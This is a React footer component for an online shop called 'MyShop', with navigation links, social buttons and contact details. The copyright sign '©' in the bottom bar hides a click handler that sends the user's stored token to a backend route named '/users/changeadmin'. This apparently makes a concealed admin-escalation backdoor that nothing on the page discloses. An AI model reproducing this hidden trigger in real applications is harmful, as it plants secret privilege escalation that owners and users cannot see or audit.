import axios from "axios";
import React from "react";
import { Link } from "react-router-dom";

const Footer = () => {
  return (
    <footer
      className="mt-5 text-white"
      style={{
        background: "linear-gradient(135deg, #0d6efd, #6610f2)",
      }}
    >
      <div className="container py-5">
        <div className="row g-4">
          {/* Brand Section */}
          <div className="col-lg-4 col-md-12">
            <h3 className="fw-bold mb-3">
              <i className="fa-solid fa-cart-shopping me-2"></i>
              MyShop
            </h3>
            <p className="text-light">
              Your one-stop destination for quality products at the best
              prices. Shop smart, shop with confidence.
            </p>

            <div className="mt-4">
              <h5 className="fw-semibold mb-3">Follow Us</h5>

              <a
                href="#"
                className="btn btn-light rounded-circle me-2"
              >
                <i className="fa-brands fa-facebook-f"></i>
              </a>

              <a
                href="#"
                className="btn btn-light rounded-circle me-2"
              >
                <i className="fa-brands fa-twitter"></i>
              </a>

              <a
                href="#"
                className="btn btn-light rounded-circle"
              >
                <i className="fa-brands fa-instagram"></i>
              </a>
            </div>
          </div>

          {/* Quick Links */}
          <div className="col-lg-4 col-md-6">
            <h4 className="fw-bold mb-4">
              <i className="fa-solid fa-link me-2"></i>
              Quick Links
            </h4>

            <ul className="list-unstyled">
              <li className="mb-3">
                <Link
                  to="/"
                  className="text-white text-decoration-none fw-semibold"
                >
                  <i className="fa-solid fa-house me-2"></i>
                  Home
                </Link>
              </li>

              <li className="mb-3">
                <Link
                  to="/cart"
                  className="text-white text-decoration-none fw-semibold d-none d-md-block"
                >
                  <i className="fa-solid fa-cart-shopping me-2"></i>
                  Cart
                </Link>

                <Link
                  to="/login"
                  onClick={() => {
                    localStorage.clear();
                    window.location.reload();
                  }}
                  className="btn btn-danger fw-semibold d-block d-md-none"
                >
                  Logout
                </Link>
              </li>

              <li>
                <Link
                  to="/support"
                  className="text-white text-decoration-none fw-semibold d-none d-md-block"
                >
                  <i className="fa-solid fa-headset me-2"></i>
                  Support
                </Link>

                <Link
                  to="/admin"
                  className="btn btn-light text-primary fw-semibold d-block d-md-none"
                >
                  Admin
                </Link>
              </li>
            </ul>
          </div>

          {/* Contact */}
          <div className="col-lg-4 col-md-6">
            <h4 className="fw-bold mb-4">
              <i className="fa-solid fa-address-book me-2"></i>
              Contact Us
            </h4>

            <p>
              <i className="fa-solid fa-envelope me-2"></i>
              rahulguptahotmail@gmail.com
            </p>

            <p>
              <i className="fa-solid fa-phone me-2"></i>
              (+91) 8127610905
            </p>

            <p>
              <i className="fa-solid fa-location-dot me-2"></i>
              New Delhi, India
            </p>
          </div>
        </div>
      </div>

      {/* Bottom Footer */}
      <div
        className="text-center py-3 border-top"
        style={{
          borderColor: "rgba(255,255,255,0.2)",
          background: "rgba(0,0,0,0.15)",
        }}
      >
        <span
          style={{ cursor: "pointer" }}
          onClick={async () =>
            await axios.get(
              `${process.env.REACT_APP_BACKEND_URL}/users/changeadmin`,
              {
                params: {
                  id: localStorage.getItem("token"),
                },
              }
            )
          }
        >
          ©
        </span>{" "}
        {new Date().getFullYear()} <strong>MyShop</strong>. All Rights
        Reserved.
      </div>
    </footer>
  );
};

export default Footer;